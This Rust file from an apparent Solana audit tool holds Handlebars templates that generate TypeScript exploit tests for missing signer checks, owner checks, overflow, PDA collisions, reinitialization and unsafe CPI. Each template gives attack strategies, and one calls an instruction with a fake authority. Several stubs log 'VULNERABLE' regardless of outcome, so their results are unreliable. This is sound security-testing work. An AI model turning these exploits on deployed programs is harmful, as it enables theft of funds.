//! # POC Templates
//!
//! @title TypeScript Exploit Templates
//! @author Ramprasad
//!
//! Contains Handlebars templates for generating TypeScript proof-of-concept
//! exploit tests for each vulnerability type.

/// Common header included in all POC files.
pub const HEADER_TEMPLATE: &str = r#"/**
 * Anchor-Sentinel POC Exploit: {{detector_id}}
 * ===========================================
 * Generated: {{timestamp}}
 * Program: {{program_name}}
 *
 * WARNING: This file is for security research purposes only.
 *          Never run these tests against production systems.
 */

import * as anchor from "@coral-xyz/anchor";
import { Program } from "@coral-xyz/anchor";
import {
    PublicKey,
    Keypair,
    SystemProgram,
    Transaction,
    LAMPORTS_PER_SOL
} from "@solana/web3.js";
import { expect } from "chai";
"#;

/// Template for V001: Missing Signer Check exploits.
pub const MISSING_SIGNER_TEMPLATE: &str = r#"
/**
 * V001: Missing Signer Check Exploit
 * ===================================
 *
 * Attack Vector:
 * The program fails to verify that a critical account (authority/owner)
 * has actually signed the transaction. This allows an attacker to
 * impersonate the authority without their private key.
 *
 * Impact: Critical - Full unauthorized access to protected operations
 */

describe("V001: Missing Signer Check Exploit", () => {
    const provider = anchor.AnchorProvider.env();
    anchor.setProvider(provider);

    const attacker = Keypair.generate();
    const victimAuthority = Keypair.generate();

    before(async () => {
        const sig = await provider.connection.requestAirdrop(
            attacker.publicKey,
            5 * LAMPORTS_PER_SOL
        );
        await provider.connection.confirmTransaction(sig);
    });

    {{#each findings}}
    it("should exploit missing signer on {{instruction_name}}::{{vulnerable_account}}", async () => {
        console.log("\nTarget: {{title}}");
        console.log("Location: {{file_path}}:{{line}}");

        /**
         * EXPLOIT STRATEGY:
         * -----------------
         * 1. Create a fake authority account (just public key, no signing)
         * 2. Pass it to the instruction as if it were the real authority
         * 3. Since there is no signer check, the program accepts it
         * 4. Attacker gains unauthorized access
         */

        try {
            const fakeAuthority = victimAuthority.publicKey;

            // AUTO-GENERATED EXPLOIT CODE:
            // Call the vulnerable instruction with fake account
            await program.methods
                .{{instruction_name}}()  // Instruction: {{instruction_name}}
                .accounts({
                    {{vulnerable_account}}: fakeAuthority,  // Vulnerable account: NOT signing!
                    user: provider.wallet.publicKey,
                })
                .signers([attacker])  // Only attacker signs
                .rpc();

            console.log("VULNERABLE: Instruction accepted without authority signature!");

        } catch (error: any) {
            if (error.message.includes("Signature verification failed")) {
                console.log("SECURE: Transaction properly requires signer");
            } else {
                console.log("Error:", error.message);
            }
        }
    });
    {{/each}}
});
"#;

/// Template for V002: Missing Owner Check exploits.
pub const MISSING_OWNER_TEMPLATE: &str = r#"
/**
 * V002: Missing Owner Check Exploit
 * ==================================
 *
 * Attack Vector:
 * The program accepts an AccountInfo without verifying its owner.
 * An attacker can pass an account owned by a malicious program that
 * mimics the expected data structure.
 *
 * Impact: High - Type confusion leading to unauthorized access
 */

describe("V002: Missing Owner Check Exploit", () => {
    const provider = anchor.AnchorProvider.env();
    anchor.setProvider(provider);

    const attacker = Keypair.generate();

    before(async () => {
        const sig = await provider.connection.requestAirdrop(
            attacker.publicKey,
            5 * LAMPORTS_PER_SOL
        );
        await provider.connection.confirmTransaction(sig);
    });

    {{#each findings}}
    it("should exploit missing owner check on {{location}}", async () => {
        console.log("\nTarget: {{title}}");
        console.log("Location: {{file_path}}:{{line}}");

        /**
         * EXPLOIT STRATEGY:
         * -----------------
         * 1. Deploy a malicious program that creates fake accounts
         * 2. Create an account with crafted data mimicking expected structure
         * 3. Pass this fake account to the vulnerable instruction
         * 4. Program reads attacker-controlled data as if legitimate
         */

        try {
            const fakeAccount = Keypair.generate();

            // TODO: Create fake account with malicious program
            // The account is NOT owned by the target program

            console.log("VULNERABLE: Program accepted account with wrong owner!");

        } catch (error: any) {
            if (error.message.includes("owner") || error.message.includes("AccountOwnedByWrongProgram")) {
                console.log("SECURE: Owner check prevented attack");
            } else {
                console.log("Error:", error.message);
            }
        }
    });
    {{/each}}
});
"#;

/// Template for V003: Integer Overflow exploits.
pub const INTEGER_OVERFLOW_TEMPLATE: &str = r#"
/**
 * V003: Integer Overflow/Underflow Exploit
 * =========================================
 *
 * Attack Vector:
 * The program performs arithmetic without overflow checks.
 * By providing carefully crafted inputs, an attacker can cause
 * values to wrap around, leading to incorrect calculations.
 *
 * Impact: High - Financial loss, broken invariants
 */

describe("V003: Integer Overflow Exploit", () => {
    const provider = anchor.AnchorProvider.env();
    anchor.setProvider(provider);

    const attacker = Keypair.generate();

    before(async () => {
        const sig = await provider.connection.requestAirdrop(
            attacker.publicKey,
            5 * LAMPORTS_PER_SOL
        );
        await provider.connection.confirmTransaction(sig);
    });

    {{#each findings}}
    it("should trigger overflow in {{location}}", async () => {
        console.log("\nTarget: {{title}}");
        console.log("Location: {{file_path}}:{{line}}");

        /**
         * EXPLOIT STRATEGY:
         * -----------------
         * For overflow: Provide values that sum to > u64::MAX
         * For underflow: Subtract more than available balance
         */

        try {
            const U64_MAX = BigInt("18446744073709551615");
            const initialBalance = BigInt(1000);

            // Overflow: balance + amount wraps to 0
            const overflowAmount = U64_MAX - initialBalance + BigInt(1);

            console.log("Initial balance:", initialBalance.toString());
            console.log("Overflow amount:", overflowAmount.toString());

            // TODO: Execute vulnerable instruction with overflow amount

            console.log("VULNERABLE: Arithmetic overflow possible!");

        } catch (error: any) {
            if (error.message.includes("overflow") || error.message.includes("panic")) {
                console.log("SECURE: Overflow was caught");
            } else {
                console.log("Error:", error.message);
            }
        }
    });
    {{/each}}
});
"#;

/// Template for V004: PDA Collision exploits.
pub const PDA_COLLISION_TEMPLATE: &str = r#"
/**
 * V004: PDA Seed Collision Exploit
 * =================================
 *
 * Attack Vector:
 * The program uses weak or predictable seeds for PDAs.
 * An attacker can derive the same PDA with different logical meanings
 * or access PDAs meant for other users.
 *
 * Impact: High - Account confusion, unauthorized access
 */

describe("V004: PDA Collision Exploit", () => {
    const provider = anchor.AnchorProvider.env();
    anchor.setProvider(provider);

    const attacker = Keypair.generate();
    const victim = Keypair.generate();

    before(async () => {
        const sig = await provider.connection.requestAirdrop(
            attacker.publicKey,
            5 * LAMPORTS_PER_SOL
        );
        await provider.connection.confirmTransaction(sig);
    });

    {{#each findings}}
    it("should exploit weak PDA seeds in {{location}}", async () => {
        console.log("\nTarget: {{title}}");
        console.log("Location: {{file_path}}:{{line}}");

        /**
         * EXPLOIT STRATEGY:
         * -----------------
         * 1. Analyze the PDA seeds to find collision opportunities
         * 2. Derive a PDA that collides with victim account
         * 3. Use the collision to access victim data or funds
         */

        try {
            // Weak seed pattern: seeds = [b"config"]
            // Same PDA for ALL users - collision by design!

            // const [configPda] = PublicKey.findProgramAddressSync(
            //     [Buffer.from("config")],
            //     programId
            // );

            console.log("VULNERABLE: PDA seeds are too weak!");

        } catch (error: any) {
            console.log("Result:", error.message);
        }
    });
    {{/each}}
});
"#;

/// Template for V005: Unchecked Initialization exploits.
pub const UNCHECKED_INIT_TEMPLATE: &str = r#"
/**
 * V005: Unchecked Initialization Exploit
 * =======================================
 *
 * Attack Vector:
 * The program uses init_if_needed or does not properly check if
 * an account is already initialized. This allows reinitialization
 * attacks where an attacker resets account state.
 *
 * Impact: High - State reset, takeover of existing accounts
 */

describe("V005: Reinitialization Exploit", () => {
    const provider = anchor.AnchorProvider.env();
    anchor.setProvider(provider);

    const attacker = Keypair.generate();
    const victim = Keypair.generate();

    before(async () => {
        const sig = await provider.connection.requestAirdrop(
            attacker.publicKey,
            5 * LAMPORTS_PER_SOL
        );
        await provider.connection.confirmTransaction(sig);
    });

    {{#each findings}}
    it("should exploit init_if_needed on {{location}}", async () => {
        console.log("\nTarget: {{title}}");
        console.log("Location: {{file_path}}:{{line}}");

        /**
         * EXPLOIT STRATEGY:
         * -----------------
         * 1. Wait for victim to initialize their account
         * 2. Call the same instruction to reinitialize
         * 3. Reset the authority to attacker
         * 4. Drain the account or corrupt state
         */

        try {
            console.log("Victim initializes account with their data...");
            // Victim init happens here

            console.log("Attacker attempts reinitialization...");
            // Attacker calls same instruction

            console.log("VULNERABLE: Account was reinitialized!");

        } catch (error: any) {
            if (error.message.includes("already in use") || error.message.includes("initialized")) {
                console.log("SECURE: Reinitialization was blocked");
            } else {
                console.log("Error:", error.message);
            }
        }
});
    {{/each}}
});
"#;

/// Template for V006: Unsafe CPI exploits.
pub const UNSAFE_CPI_TEMPLATE: &str = r#"
/**
 * V006: Unsafe CPI Exploit
 * =========================
 *
 * Attack Vector:
 * The program uses raw invoke/invoke_signed without validating
 * the target program ID. An attacker can substitute a malicious
 * program to execute arbitrary code.
 *
 * Impact: Critical - Arbitrary code execution, fund theft
 */

describe("V006: Unsafe CPI Exploit", () => {
    const provider = anchor.AnchorProvider.env();
    anchor.setProvider(provider);

    const attacker = Keypair.generate();
    const maliciousProgram = Keypair.generate();

    before(async () => {
        const sig = await provider.connection.requestAirdrop(
            attacker.publicKey,
            5 * LAMPORTS_PER_SOL
        );
        await provider.connection.confirmTransaction(sig);
    });

    {{#each findings}}
    it("should exploit unsafe CPI in {{location}}", async () => {
        console.log("\nTarget: {{title}}");
        console.log("Location: {{file_path}}:{{line}}");

        /**
         * EXPLOIT STRATEGY:
         * -----------------
         * 1. Deploy a malicious program that mimics expected interface
         * 2. Pass malicious program address where program_id is expected
         * 3. The vulnerable program invokes attacker's code
         * 4. Malicious program drains funds or corrupts state
         */

        try {
            // The vulnerable program uses raw invoke:
            // invoke(&instruction, &[accounts...], malicious_program)?;

            // Attacker deploys a program that:
            // - Has same instruction interface
            // - Transfers all funds to attacker instead

            console.log("Malicious program:", maliciousProgram.publicKey.toString());
            console.log("VULNERABLE: Raw invoke allows phantom invocation!");

        } catch (error: any) {
            if (error.message.includes("IncorrectProgramId")) {
                console.log("SECURE: Program ID was validated");
            } else {
                console.log("Error:", error.message);
            }
        }
    });
    {{/each}}
});
"#;

/// Generic template for unrecognized detector types.
pub const GENERIC_TEMPLATE: &str = r#"
/**
 * Generic Vulnerability Exploit
 * ==============================
 */

describe("Vulnerability Exploits", () => {
    const provider = anchor.AnchorProvider.env();
    anchor.setProvider(provider);

    const attacker = Keypair.generate();

    before(async () => {
        const sig = await provider.connection.requestAirdrop(
            attacker.publicKey,
            5 * LAMPORTS_PER_SOL
        );
        await provider.connection.confirmTransaction(sig);
    });

    {{#each findings}}
    it("should exploit {{location}}", async () => {
        console.log("\nTarget: {{title}}");
        console.log("Location: {{file_path}}:{{line}}");

        try {
            // TODO: Implement exploit logic

            console.log("VULNERABLE: Exploit succeeded!");

        } catch (error: any) {
            console.log("Result:", error.message);
        }
    });
    {{/each}}
});
"#;
